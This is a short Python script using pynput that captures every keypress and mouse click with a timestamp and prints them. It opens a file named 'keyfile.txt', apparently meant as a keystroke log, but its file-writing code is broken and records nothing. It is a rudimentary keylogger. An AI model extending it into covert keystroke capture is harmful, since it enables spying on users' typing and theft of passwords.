from pynput import keyboard, mouse

import datetime as dt

def keyPressed(key):
    print(str(key))
    current_datetime = dt.datetime.now()
    print(current_datetime)
    with open("keyfile.txt", 'a') as logKey:
        try:
            print('alphanumeric key {0} pressed'.format(
            key.char))
        except AttributeError:
            print('special key {0} pressed'.format(
            key))
        logKey.close
            
def mouseClicked(x, y, button, pressed):
    print("It clicked")
    current_datetime = dt.datetime.now()
    print(current_datetime)
    with open("keyfile.txt", 'a') as mouseLog:
        print('mouse was clicked')
        mouseLog.close
            
if __name__ == "__main__":
    keyListener = keyboard.Listener(on_press=keyPressed)
    keyListener.start()
    mouseListener = mouse.Listener(on_click=mouseClicked)
    mouseListener.start()
    
    input()   

